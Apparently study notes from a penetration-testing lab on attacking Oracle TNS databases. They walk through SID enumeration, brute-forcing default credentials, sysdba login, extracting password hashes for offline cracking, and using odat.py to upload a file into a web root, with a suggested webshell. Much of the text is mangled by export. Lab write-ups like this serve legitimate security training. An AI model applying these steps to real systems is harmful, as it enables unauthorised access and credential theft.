> [!caution] This page contained a drawing which was not converted.   

Install tools:

![Exported image](Exported%20image%2020240712140406-0.png)  

Step 1: Enumerate
 ![Exported image](Exported%20image%2020240712140406-1.png) ![Exported image](Exported%20image%2020240712140406-2.png)  

We're looking for SIDs, when the client specifies which database instance it wants to connect to.
 
Step 2: Brute-force SIDs

![Exported image](Exported%20image%2020240712140406-3.png)

OR

![Exported image](Exported%20image%2020240712140406-4.png)

FOUND: scott:tiger
 
Step 3: Login with creds

![Exported image](Exported%20image%2020240712140406-5.png)

If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).  

```
burray@htb
[/htb]
$
sudo sh 
-c 
"echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
;
sudo 
ldconfig







burray@htb
[/htb]
$
echo
"Oracle File Upload Test"
>
testing.txtburray@htb
[/htb]
$
./odat.py utlfile -s 
10.129
.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
￼
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file

```

[/htb]$sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig  
 [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) 
 
Step 4: Interaction

![Exported image](Exported%20image%2020240712140406-6.png)  
![Exported image](Exported%20image%2020240712140406-7.png)

Scott is not an admin but we might be able to use his account to log in as the System Database Admin (sysdba).
 
Step 5: Database Enumeration

![Exported image](Exported%20image%2020240712140406-8.png)  

XE found in nmap scan

Extract password hashes in sys.user$ for cracking offline

![Exported image](Exported%20image%2020240712140406-9.png)  

**Another option is uploading a webshell. WINDOWS C:\inetpub\wwwroot LINUX /var/www/html**
 
burray@htb[/htb]$echo"Oracle File Upload Test">testing.txtburray@htb[/htb]$./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
 
[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server ￼[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
 
**Then use curl -X GET** **http://<IP>/testing.txt**